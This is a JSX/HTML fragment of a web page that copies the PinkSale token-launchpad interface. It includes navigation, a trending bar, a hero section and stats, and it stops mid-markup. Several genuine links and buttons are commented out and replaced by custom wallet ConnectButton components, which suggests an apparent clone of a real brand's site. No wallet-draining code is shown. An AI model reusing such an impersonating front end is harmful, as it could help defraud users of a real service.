                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                      <path d="M888 792H200V168c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v688c0 4.4 3.6 8 8 8h752c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM305.8 637.7c3.1 3.1 8.1 3.1 11.3 0l138.3-137.6L583 628.5c3.1 3.1 8.2 3.1 11.3 0l275.4-275.3c3.1-3.1 3.1-8.2 0-11.3l-39.6-39.6a8.03 8.03 0 0 0-11.3 0l-230 229.9L461.4 404a8.03 8.03 0 0 0-11.3 0L266.3 586.7a8.03 8.03 0 0 0 0 11.3l39.5 39.7z"></path>
                    </svg>
                  </div>
                  <div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">dexview.com</div>
                  </a>
                </li>

                <li><a href="https://t.me/PinkSaleTracking" class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer"><div class="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M193 796c0 17.7 14.3 32 32 32h574c17.7 0 32-14.3 32-32V563c0-176.2-142.8-319-319-319S193 386.8 193 563v233zm72-233c0-136.4 110.6-247 247-247s247 110.6 247 247v193H404V585c0-5.5-4.5-10-10-10h-44c-5.5 0-10 4.5-10 10v171h-75V563zm-48.1-252.5l39.6-39.6c3.1-3.1 3.1-8.2 0-11.3l-67.9-67.9a8.03 8.03 0 0 0-11.3 0l-39.6 39.6a8.03 8.03 0 0 0 0 11.3l67.9 67.9c3.1 3.1 8.1 3.1 11.3 0zm669.6-79.2l-39.6-39.6a8.03 8.03 0 0 0-11.3 0l-67.9 67.9a8.03 8.03 0 0 0 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l67.9-67.9c3.1-3.2 3.1-8.2 0-11.3zM832 892H192c-17.7 0-32 14.3-32 32v24c0 4.4 3.6 8 8 8h688c4.4 0 8-3.6 8-8v-24c0-17.7-14.3-32-32-32zM484 180h56c4.4 0 8-3.6 8-8V76c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v96c0 4.4 3.6 8 8 8z"></path></svg></div><div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Pools alert</div></a></li>

                <li><a href="https://docs.pinksale.finance/important/kyc-and-audit-at-pinksale" class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer"><div class="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M17.03 9.78a.75.75 0 0 0-1.06-1.06l-5.47 5.47-2.47-2.47a.75.75 0 0 0-1.06 1.06l3 3a.75.75 0 0 0 1.06 0l6-6Z"></path><path d="m14.136 1.2 1.375 1.01c.274.201.593.333.929.384l1.687.259a3.61 3.61 0 0 1 3.02 3.021l.259 1.686c.051.336.183.655.384.929l1.01 1.375a3.61 3.61 0 0 1 0 4.272l-1.01 1.375a2.106 2.106 0 0 0-.384.929l-.259 1.687a3.61 3.61 0 0 1-3.021 3.02l-1.686.259a2.106 2.106 0 0 0-.929.384l-1.375 1.01a3.61 3.61 0 0 1-4.272 0l-1.375-1.01a2.106 2.106 0 0 0-.929-.384l-1.687-.259a3.61 3.61 0 0 1-3.02-3.021l-.259-1.686a2.117 2.117 0 0 0-.384-.929L1.2 14.136a3.61 3.61 0 0 1 0-4.272l1.01-1.375c.201-.274.333-.593.384-.929l.259-1.687a3.61 3.61 0 0 1 3.021-3.02l1.686-.259c.336-.051.655-.183.929-.384L9.864 1.2a3.61 3.61 0 0 1 4.272 0Zm-3.384 1.209-1.375 1.01a3.614 3.614 0 0 1-1.59.658l-1.686.258a2.111 2.111 0 0 0-1.766 1.766l-.258 1.686a3.61 3.61 0 0 1-.658 1.589l-1.01 1.376a2.11 2.11 0 0 0 0 2.496l1.01 1.375c.344.469.57 1.015.658 1.59l.258 1.686c.14.911.855 1.626 1.766 1.766l1.686.258a3.61 3.61 0 0 1 1.589.658l1.376 1.01a2.11 2.11 0 0 0 2.496 0l1.375-1.01a3.613 3.613 0 0 1 1.59-.657l1.686-.26a2.11 2.11 0 0 0 1.766-1.765l.258-1.686a3.61 3.61 0 0 1 .658-1.589l1.01-1.376a2.11 2.11 0 0 0 0-2.496l-1.01-1.375a3.613 3.613 0 0 1-.657-1.59l-.26-1.686a2.11 2.11 0 0 0-1.765-1.766l-1.686-.258a3.61 3.61 0 0 1-1.589-.658l-1.376-1.01a2.11 2.11 0 0 0-2.496 0Z"></path></svg></div><div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">KYC &amp; Audit</div></a></li>

                <li><a href="https://docs.pinksale.finance" class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer"><div class="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" aria-hidden="true" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg></div><div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Docs</div></a></li>

                <li><a href="https://shop.pinksale.finance/" class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer"><div class="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M922.9 701.9H327.4l29.9-60.9 496.8-.9c16.8 0 31.2-12 34.2-28.6l68.8-385.1c1.8-10.1-.9-20.5-7.5-28.4a34.99 34.99 0 0 0-26.6-12.5l-632-2.1-5.4-25.4c-3.4-16.2-18-28-34.6-28H96.5a35.3 35.3 0 1 0 0 70.6h125.9L246 312.8l58.1 281.3-74.8 122.1a34.96 34.96 0 0 0-3 36.8c6 11.9 18.1 19.4 31.5 19.4h62.8a102.43 102.43 0 0 0-20.6 61.7c0 56.6 46 102.6 102.6 102.6s102.6-46 102.6-102.6c0-22.3-7.4-44-20.6-61.7h161.1a102.43 102.43 0 0 0-20.6 61.7c0 56.6 46 102.6 102.6 102.6s102.6-46 102.6-102.6c0-22.3-7.4-44-20.6-61.7H923c19.4 0 35.3-15.8 35.3-35.3a35.42 35.42 0 0 0-35.4-35.2zM305.7 253l575.8 1.9-56.4 315.8-452.3.8L305.7 253zm96.9 612.7c-17.4 0-31.6-14.2-31.6-31.6 0-17.4 14.2-31.6 31.6-31.6s31.6 14.2 31.6 31.6a31.6 31.6 0 0 1-31.6 31.6zm325.1 0c-17.4 0-31.6-14.2-31.6-31.6 0-17.4 14.2-31.6 31.6-31.6s31.6 14.2 31.6 31.6a31.6 31.6 0 0 1-31.6 31.6z"></path></svg></div><div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Shop</div></a></li>


              </ul>
              <div className="border-b w-full dark:border-neutral-800"></div>

              <ul className="my-2 py-2">
                <li><div className="transition-all my-2 flex items-center gap-2 capitalize hover:text-brand cursor-pointer pr-[4px]"><div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md relative"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 256 256" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M236.88,26.19a9,9,0,0,0-9.16-1.57L25.06,103.93a14.22,14.22,0,0,0,2.43,27.21L80,141.45V200a15.92,15.92,0,0,0,10,14.83,15.91,15.91,0,0,0,17.51-3.73l25.32-26.26L173,220a15.88,15.88,0,0,0,10.51,4,16.3,16.3,0,0,0,5-.79,15.85,15.85,0,0,0,10.67-11.63L239.77,35A9,9,0,0,0,236.88,26.19Zm-61.14,36L86.15,126.35l-49.6-9.73ZM96,200V152.52l24.79,21.74Zm87.53,8L100.85,135.5l119-85.29Z"></path></svg></div><div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">telegram</div><div className="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform: 'none'}}><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"></path></svg></div></div><div className=" hidden-against-adblock group-hover:block transition-all"></div></li>
                <li><a href="https://twitter.com/pinkecosystem" class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer"><div class="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></div><div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Twitter</div></a></li>
                <li><a href="https://www.facebook.com/profile.php?id=100085950917722" class="group transition-all dark:text-brand-text-dark my-2 flex items-center gap-2 hover:text-brand" target="_blank" rel="nofollow noreferrer"><div class="grid w-[38px] h-[38px] px-[10px] ml-[2px] place-content-center rounded-md"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-32 736H663.9V602.2h104l15.6-120.7H663.9v-77.1c0-35 9.7-58.8 59.8-58.8h63.9v-108c-11.1-1.5-49-4.8-93.2-4.8-92.2 0-155.3 56.3-155.3 159.6v89H434.9v120.7h104.3V848H176V176h672v672z"></path></svg></div><div class="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Facebook</div></a></li>
              </ul>
              <div className="border-b w-full dark:border-neutral-800"></div>

              <ul className="my-2 py-2">
                <li><div className="transition-all my-2 flex items-center gap-2 capitalize hover:text-brand cursor-pointer pr-[4px]"><div className="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md"><svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8V16Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2ZM12 4V8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16V20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4Z" fill="currentColor"></path></svg></div><div className="flex-1 hidden-against-adblock group-hover:block line-clamp-1 whitespace-nowrap">Theme</div><div className="w-[18px] hidden-against-adblock group-hover:block transition-all" style={{transform:"none"}}><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"></path></svg></div></div><div className=" hidden-against-adblock group-hover:block transition-all"></div>
                </li>
              </ul>



            </div>
        </nav>
      </div>
      <div className="md:ml-[75px]">

        <header className="px-6 py-4 sticky top-0 right-0 flex items-center h-[75px] gap-4 bg-white dark:bg-brand-dark z-50 border-b dark:border-neutral-800">
          <div className="flex-shrink-0 block md:hidden">
            <a href="/">
            <Image alt="PinkSale" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
            </a>
          </div>
          <div className="flex-1 hidden-against-adblock md:block">
            <div className="relative inline-block w-full lg:w-1/2">
              <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" className="text-neutral-500 dark:text-brand-text-dark absolute left-2 top-1/2 -translate-y-1/2" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                <path d="M10 18a7.952 7.952 0 0 0 4.897-1.688l4.396 4.396 1.414-1.414-4.396-4.396A7.952 7.952 0 0 0 18 10c0-4.411-3.589-8-8-8s-8 3.589-8 8 3.589 8 8 8zm0-14c3.309 0 6 2.691 6 6s-2.691 6-6 6-6-2.691-6-6 2.691-6 6-6z"></path>
              </svg>
              <input onChange={produce} placeholder="Type token symbol, address to find your launchpad" className="transition-all outline-none focus:shadow-outline border dark:text-brand-text-dark py-[5px] focus:border-brand dark:border-neutral-800 w-full px-8 text-sm dark:text-brand-text-dark dark:bg-brand-dark rounded-md" type="text" />
              <svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" className="text-neutral-500 dark:text-brand-text-dark absolute right-2 top-1/2 -translate-y-1/2" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                <path d="M16.1925 7.70711C15.8019 7.31658 15.1688 7.31658 14.7782 7.70711L7.70718 14.7782C7.31665 15.1687 7.31665 15.8019 7.70718 16.1924C8.0977 16.5829 8.73087 16.5829 9.12139 16.1924L16.1925 9.12132C16.583 8.7308 16.583 8.09763 16.1925 7.70711Z" fill="currentColor"></path>
                <path fill-rule="evenodd" clip-rule="evenodd" d="M3 6C3 4.34315 4.34315 3 6 3H18C19.6569 3 21 4.34315 21 6V18C21 19.6569 19.6569 21 18 21H6C4.34315 21 3 19.6569 3 18V6ZM6 5H18C18.5523 5 19 5.44772 19 6V18C19 18.5523 18.5523 19 18 19H6C5.44772 19 5 18.5523 5 18V6C5 5.44772 5.44772 5 6 5Z" fill="currentColor"></path>
              </svg>
            </div>
          </div>
          <div className="flex-1 block md:hidden-against-adblock text-right">
            <div className="flex gap-2 sm:gap-4 items-center justify-end"><div>
              {/* <a href="#" onClick={clicked}>
                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                  <path d="M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1-56.6-56.7-132-87.9-212.1-87.9s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6a8.2 8.2 0 0 0 11.6 0l43.6-43.5a8.2 8.2 0 0 0 0-11.6zM570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4z"></path>
                </svg>
              </a> */}
              <ConnectButton type={'search'} />
            </div>
            <a href="https://www.dexview.com/" className="p-3 rounded-md border flex dark:border-neutral-300" target="_blank" rel="nofollow noreferrer">
              <Image src={dexview} height={20} width={20} alt="Dexview" className="w-[20px] h-[20px]" />
              <span className="ml-2 font-[500] text-sm hidden-against-adblock md:block" >dexview.com</span>
            </a>
          <div>
          <div>
            <ConnectButton type={'connect'} />
          </div>
        </div>
        </div>
          </div>

          {/* <div class="hidden-against-adblock md:flex">
              <div class="items-center gap-4 flex">
                <a href="https://www.dexview.com/" class="p-3 rounded-md border flex dark:border-neutral-800" target="_blank" rel="nofollow noreferrer">
                  <Image src={dexview} alt="Dexview" height="20" width="20" class="w-[20px] h-[20px]" />
                  <span class="ml-2 font-[500] text-sm hidden-against-adblock md:block">dexview.com</span>
                </a>
                <div>
                <button type="button" class="ant-btn ant-btn-primary">
                  <div class="flex items-center gap-1">
                    <div>Connect</div>
                    <div class="hidden-against-adblock sm:block">Wallet</div>
                  </div>
                </button>
                </div>
              </div>
          </div> */}
          <div class="md:hidden">
            <button onClick={change_}>
              <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="inline-block" height="30" width="30" xmlns="http://www.w3.org/2000/svg">
                <path fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="48" d="M88 152h336M88 256h336M88 360h336"></path>
              </svg>
            </button>
          </div>


        </header>



        <ul class="px-6 bg-white dark:bg-brand-dark shadow-sm flex items-center gap-2">
        <li class="text-sm font-medium flex items-center gap-1"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" class="animate-ping text-orange-400 w-[14px]" height="10" width="10" xmlns="http://www.w3.org/2000/svg"><path d="M5.52.359A.5.5 0 0 1 6 0h4a.5.5 0 0 1 .474.658L8.694 6H12.5a.5.5 0 0 1 .395.807l-7 9a.5.5 0 0 1-.873-.454L6.823 9.5H3.5a.5.5 0 0 1-.48-.641l2.5-8.5zM6.374 1 4.168 8.5H7.5a.5.5 0 0 1 .478.647L6.78 13.04 11.478 7H8a.5.5 0 0 1-.474-.658L9.306 1H6.374z"></path></svg> <span class="hidden-against-adblock sm:inline-block">Trending</span>
        </li>
        <li class="flex-1 overflow-x-auto">
                {data && data.length ? (
                  <ul class="flex items-center">
                     {toplinks()}
                  </ul>
                ): (
                  <ul class="flex items-center">
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                    <li class="h-[20px] w-[60px] mx-2 my-2 bg-neutral-200 dark:opacity-50 animate-pulse rounded-md"></li>
                </ul>
                )}



        </li>
        </ul>

        {/* <ul class="px-6 bg-white dark:bg-brand-dark shadow-sm flex items-center gap-2">
        <li class="text-sm font-medium flex items-center gap-1"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" class="animate-ping text-orange-400 w-[14px]" height="10" width="10" xmlns="http://www.w3.org/2000/svg"><path d="M5.52.359A.5.5 0 0 1 6 0h4a.5.5 0 0 1 .474.658L8.694 6H12.5a.5.5 0 0 1 .395.807l-7 9a.5.5 0 0 1-.873-.454L6.823 9.5H3.5a.5.5 0 0 1-.48-.641l2.5-8.5zM6.374 1 4.168 8.5H7.5a.5.5 0 0 1 .478.647L6.78 13.04 11.478 7H8a.5.5 0 0 1-.474-.658L9.306 1H6.374z"></path></svg> <span class="hidden-against-adblock sm:inline-block">Trending</span></li>
        <li class="flex-1 overflow-x-auto">
          <ul class="flex items-center">
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#1</span>
              <a class="text-brand" href="/solana/launchpad/EGq1RAXKhA1Sq2J2HFsUsE6xjYqeB7qN3CR4RrnPWwAT">OX</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#2</span>
              <a class="text-brand" href="/launchpad/bsc/0xeD5D6932040A5AD9bC0836589A5d7256BC1b1220">CHADCAT</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#3</span>
              <a class="text-brand" href="/solana/launchpad/DxWt9cA1pPo3V94LSUDrDKrvXiHHRUpYNyG7ERQ134KP">W3S</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#4</span>
              <a class="text-brand" href="/solana/launchpad/3bjFQPqRZddAxSTqcxkTRwPuVc7ujFSkvXJyVHEcsTZN">INGER</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#5</span>
              <a class="text-brand" href="/launchpad/ethereum/0xaABCe75d2AcEe988b18a65489357F6CdceC4bfBB">GSlam</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#6</span>
              <a class="text-brand" href="/launchpad/ethereum/0xc850607a4074A3a98c41ec2Af3234EC22C2Db30E">MSHOT</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#7</span>
              <a class="text-brand" href="/solana/launchpad/BoGsES1FXxsgvwAJ9TY2J9T79Y6iq86nuZnz3E7qmE7i">ROY</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#8</span>
              <a class="text-brand" href="/launchpad/base/0x95F2e04eD6351AeAB7225b6A7ccd3189Cf306d20">ALDIN</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#9</span>
              <a class="text-brand" href="/solana/launchpad/EadWreg6oiN88bF1wdK76tvSqMyRQtvXMkSnBvWs5eJe">CATICORN</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#10</span>
              <a class="text-brand" href="/solana/launchpad/GtAfA72RnBV5Q492NK4TSCCuY3V8miog6dxwxeimvESP">Cat³</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#11</span>
              <a class="text-brand" href="/launchpad/ethereum/0xcDaB3c4998c5dBC2e70C81398292Cf97fe8219f1">ULA</a>
            </li>
            <li class="px-2 py-2 flex gap-2 text-sm whitespace-nowrap">
              <span class="font-medium">#12</span>
              <a class="text-brand" href="/solana/launchpad/GfwZR63RFrnTooSXN1EtD5ebPAncdDjukVWXP8CRpWiZ">JOSE</a>
            </li>
          </ul>
        </li>
        </ul> */}

       <div class="flex items-center flex-col lg:flex-row justify-between gap-2 bg-transparent lg:bg-white dark:lg:bg-brand-dark shadow-none lg:shadow-sm px-0 lg:px-6 relative">
          <div class="flex-1 w-full lg:w-[calc(50%-20px)] flex items-center bg-white dark:bg-brand-dark lg:bg-transparent shadow-sm lg:shadow-none px-6 lg:px-0">
          <div class="text-sm font-medium flex items-center gap-1"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-[14px] animate-ping text-red-400" height="14" width="14" xmlns="http://www.w3.org/2000/svg"><path d="M256.16 15.822c-74.685 0-124.825 36.292-157.865 90.487C66.36 158.692 51.637 228.053 50.68 294.954c44.44 12.795 73.834 28.683 90.46 50.123 15.804 20.383 18.445 45.188 12.157 71.963 23.635 7.218 62.826 11.32 100.986 10.905 38.28-.416 76.213-5.67 96.373-13.44-4.608-25.936-.182-50.215 16.983-70.07 17.928-20.738 48.197-36.53 93.4-49.488-.972-63.406-15.24-132.688-46.868-185.92-20.367-34.277-47.386-61.936-82.97-77.972-62.555 14.347-113.232 44.996-143.62 84.12 25.38 8.96 46.088 21.593 65.35 34.583l10.742 7.244-10.266 7.906c-26.884 20.705-46.28 43.707-65.26 67.48 28.468 22.27 47.56 52.2 29.02 65.186-33.572 23.518-170.713 1.396-119.002-78.754 6.006-9.31 15.307-13.314 26.2-13.496 14.635-.244 32.144 6.414 48.4 16.37 17.11-21.452 35.198-43.144 59.1-63.32-18.538-11.88-37.98-22.425-61.975-29.265l-12.29-3.503 7.066-10.65c28.184-42.48 75.737-75.727 134.613-94.523-13.362-3.012-27.71-4.612-43.118-4.612h-.002zm126.594 189.502c10.892.182 20.19 4.187 26.197 13.496 51.712 80.15-85.427 102.272-119 78.754-31.496-22.06 45.603-93.04 92.804-92.25zM252.2 309.057c13.922 0 38.53 68.05 30.277 79.51-6.48 8.996-54.935 8.617-60.555 0-7.197-11.034 16.31-79.51 30.277-79.51zM354.71 433.13c-10.557 3.91-23.223 6.832-37.17 8.952l5.94 48.89h53.416l-22.185-57.84zm-207.888 1.57l-18.5 56.273h47.092l5.914-48.684c-12.764-1.877-24.484-4.38-34.506-7.59zm152.17 9.667c-13.13 1.28-26.996 1.98-41.078 2.21v44.396h46.74l-5.662-46.606zm-99.107.14l-5.647 46.466h44.99V446.6c-13.444-.204-26.714-.894-39.343-2.094z"></path></svg> <span class="hidden-against-adblock sm:inline-block">Degen</span></div>

          {/* <ul class="overflow-x-auto flex items-center">
            <li class="px-2 py-2 flex gap-2 flex-shrink-0 text-sm whitespace-nowrap">
              <span class="font-medium">#1</span>
              <a class="text-brand" href="/degen/bsc/0xe0529e3beb120c79eda7bd50163c4cbf1d8a44d7">TDT</a>
              <div class="ant-progress ant-progress-circle ant-progress-status-normal ant-progress-default" role="progressbar">
                <div class="ant-progress-inner" style="width: 16px; height: 16px; font-size: 8.4px;">
                  <svg class="ant-progress-circle" viewBox="-50 -50 100 100" role="presentation">
                    <circle class="ant-progress-circle-trail" r="42" cx="0" cy="0" stroke-linecap="round" stroke-width="16" style="stroke-dasharray: 263.894px, 263.894; stroke-dashoffset: 0; transform: rotate(-90deg); transform-origin: 0px 0px; transition: stroke-dashoffset 0.3s ease 0s, stroke-dasharray 0.3s ease 0s, stroke 0.3s ease 0s, stroke-width 0.06s ease 0.3s, opacity 0.3s ease 0s; fill-opacity: 0;"></circle>
                    <circle class="ant-progress-circle-path" r="42" cx="0" cy="0" stroke-linecap="round" stroke-width="16" opacity="1" style="stroke: rgb(72, 199, 116); stroke-dasharray: 263.894px, 263.894; stroke-dashoffset: 78.4766; transform: rotate(-90deg); transform-origin: 0px 0px; transition: stroke-dashoffset 0s ease 0s, stroke-dasharray 0s ease 0s, stroke ease 0s, stroke-width ease 0.3s, opacity ease 0s; fill-opacity: 0;"></circle>
                    <circle class="ant-progress-circle-path" r="42" cx="0" cy="0" stroke-linecap="round" stroke-width="16" opacity="0" style="stroke: rgb(82, 196, 26); stroke-dasharray: 263.894px, 263.894; stroke-dashoffset: 263.884; transform: rotate(-90deg); transform-origin: 0px 0px; transition: stroke-dashoffset 0s ease 0s, stroke-dasharray 0s ease 0s, stroke ease 0s, stroke-width ease 0.3s, opacity ease 0s; fill-opacity: 0;"></circle>
                  </svg>
                </div>
              </div>
              </li>
          </ul> */}

          </div>
       </div>

       <main class="min-h-screen">
          <div style={{opacity:1, transform:"none"}}>
              <div class="mx-auto my-4 sm:my-6 md:my-12 container">
                  <div class="flex gap-4 items-center flex-col md:flex-row">

                          <section class="py-8 sm:py-16 md:py-20 lg:py-24 flex flex-col justify-center text-center md:text-left p-5">
                              <div>
                              <h1 class="text-2xl md:text-3xl lg:text-3xl xl:text-4xl font-semibold leading-relaxed">The Launchpad Protocol for Everyone</h1>
                              <p class="leading-relaxed pt-6">PinkSale helps everyone to create their own tokens and token sales in few seconds.</p>
                              <p class="leading-relaxed pb-4">Tokens created on PinkSale will be verified and published on explorer websites.</p>
                              <div class="pt-4 flex gap-4 items-center justify-center md:justify-start">
                                {/* <a href="/launchpad/create">
                                <button onClick={clicked} type="button" class="ant-btn ant-btn-primary"><span>Create now</span></button>
                                </a> */}

                                <ConnectButton type={'create'} />

                                <a href="https://docs.pinksale.finance" class="hover:text-brand underline" target="_blank" rel="nofollow noreferrer">Learn more</a></div>
                              </div>
                          </section>

                          <div>
                            <div class="animation-fly-wrapper">
                              <div class="homepage-stats">
                                <div class="text-xs py-2 px-4 border-b border-dashed dark:border-neutral-800">🎉 How big are we?</div>
                                <div class="p-6">
                                  <div class="grid grid-cols-2 gap-6">
                                    <div class="transition-all flex-1 flex flex-col items-center">
                                      <div class="text-4xl leading-relaxed uppercase text-brand">$1.5B</div>
                                      <div class="text-xs">Total Liquidity Raised</div>
                                    </div>
                                    <div class="transition-all flex-1 flex flex-col items-center">
                                    <div class="text-4xl leading-relaxed uppercase text-brand">29.5K</div>
                                    <div class="text-xs">Total Projects</div>
                                  </div>
                                  <div class="transition-all flex-1 flex flex-col items-center">
